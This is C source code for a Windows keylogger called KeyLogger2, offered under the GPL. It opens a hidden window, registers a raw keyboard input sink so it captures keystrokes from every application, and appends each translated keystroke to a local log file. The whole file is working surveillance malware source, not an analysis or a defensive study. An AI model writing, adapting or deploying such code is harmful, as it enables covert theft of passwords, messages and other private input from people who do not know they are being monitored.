/*
 * Tool name   : KeyLogger2
 * Description : A tool to intercept keystrokes and save them
 *               in a file by grabbing data coming from a raw
 *               input device.
 * Author      : Ruben Unteregger
 * Homepage    : http://www.megapanzer.com
 *
 * Version     : 0.1
 * OS          : Tested on Microsoft Windows XP
 * Todo        : -
 *
 * Changes     : -
 * 
 * 
 *
 *
 *
 * License     :
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 *
 */


#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include "KeyLogger2.h"



/*
 * Functions foward declarations
 *
 */

ATOM MyRegisterClass(HINSTANCE hInstance);
LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow);
void logKey(UINT pKey);


/*
 * Entry point
 *
 */

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
  MSG lWindowMessage;
  HWND lWindowHandle;
  HWND lForegroundWindow;
  RAWINPUTDEVICE lRID;
  int lRetVal = 0;


  /*
   * Initialize stuff and things
   *
   */

  DeleteFile(OUPTUT_FILE);
  MyRegisterClass(hInstance);
  lForegroundWindow = GetForegroundWindow();
  gPreviousWasASpecialChar = false;

  if (!(lWindowHandle = CreateWindow(CLASSNAME, WINDOWNAME, WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, NULL, NULL, hInstance, NULL)))
    return(1);

  ShowWindow(lWindowHandle, SW_HIDE);
  UpdateWindow(lWindowHandle);
  SetForegroundWindow(lForegroundWindow);


  /*
   * Register the input device
   *
   */

  lRID.usUsagePage = 0x01;
  lRID.usUsage = 0x06;
  lRID.dwFlags = RIDEV_INPUTSINK;
  lRID.hwndTarget = lWindowHandle;
            
  if(! RegisterRawInputDevices(&lRID, 1, sizeof(RAWINPUTDEVICE)))
  {
    lRetVal = 1;
	goto END;
  }
    

  /*
   * Main message loop:
   *
   */

  while(1)
  {
    if (GetQueueStatus(QS_ALLINPUT) != 0)
	{
      if (GetMessage(&lWindowMessage, NULL, 0, 0)) 
	  {
        TranslateMessage(&lWindowMessage);
        DispatchMessage(&lWindowMessage);
	  }
	}
	Sleep(10);
  }

END:

  return(lRetVal);
}





/*
 * 
 *
 */

ATOM MyRegisterClass(HINSTANCE hInstance)
{
  WNDCLASSEX lWCEX;

  lWCEX.cbSize = sizeof(WNDCLASSEX); 
  lWCEX.style = CS_HREDRAW | CS_VREDRAW;
  lWCEX.lpfnWndProc = (WNDPROC)WndProc;
  lWCEX.cbClsExtra = 0;
  lWCEX.cbWndExtra = 0;
  lWCEX.hInstance = hInstance;
  lWCEX.hIcon = NULL;
  lWCEX.hCursor = NULL;
  lWCEX.hbrBackground = (HBRUSH)(COLOR_WINDOW+1);
  lWCEX.lpszMenuName = WINDOWNAME;
  lWCEX.lpszClassName = CLASSNAME;
  lWCEX.hIconSm = NULL;

  return RegisterClassEx(&lWCEX);
}





// Window procedure of our message-only window
LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
    UINT lSize;
    RAWINPUT *lData;
    
    switch(msg)
    {
        case WM_CREATE:
            break;
        case WM_INPUT:
            GetRawInputData((HRAWINPUT)lParam, RID_INPUT, NULL, &lSize, sizeof(RAWINPUTHEADER));
        
            lData = (RAWINPUT*)HeapAlloc(GetProcessHeap(), 0, lSize);
        
            if(GetRawInputData((HRAWINPUT)lParam, RID_INPUT, lData, &lSize, sizeof(RAWINPUTHEADER)))
              if(lData->header.dwType == RIM_TYPEKEYBOARD && lData->data.keyboard.Message == WM_KEYDOWN)
                logKey(lData->data.keyboard.VKey);
//                LogKey(lLogFileHandle, lData->data.keyboard.VKey);

            if (lData)
              HeapFree(GetProcessHeap(), 0, lData);
            break;   
        case WM_DESTROY:
            PostQuitMessage(0);
            break;
        default:
            return DefWindowProc(hwnd, msg, wParam, lParam);
    }

    return(0);
}



void logKey(UINT pKey) 
{
  FILE *lFH = NULL;
  BYTE lKeyboard[256];
  char lKey[32];
  WORD lWKey;
  char lTemp[32];

        

  GetKeyState(VK_CAPITAL); 
  GetKeyState(VK_SCROLL); 
  GetKeyState(VK_NUMLOCK);
  GetKeyboardState(lKeyboard);
    
  ZeroMemory(lTemp, sizeof(lTemp));



  switch(pKey)
  {
    case VK_BACK:
        snprintf(lTemp, sizeof(lTemp) - 1, "[BP]");
        break;
    case VK_TAB:
        snprintf(lTemp, sizeof(lTemp) - 1, "[TAB]");
        break;
    case VK_RETURN:
        strcpy(lTemp, "\r\n");
        break;
    case VK_SHIFT:
        break;
    default:
        if(ToAscii(pKey, MapVirtualKey(pKey, 0), lKeyboard, &lWKey, 0) == 1)
            snprintf(lTemp, sizeof(lTemp) - 1, "%c", (char) lWKey);
        else if(GetKeyNameText(MAKELONG(0, MapVirtualKey(pKey, 0)), lKey, 32) > 0)
            snprintf(lTemp, sizeof(lTemp) - 1, "[%s]", lKey);
        break;
  }



  /*
   *  Print this name to the standard console output device.
   *
   */

  if ((lFH = fopen(OUPTUT_FILE, "a")))
  {
    fprintf(lFH, lTemp);
    fclose(lFH);
  }
}

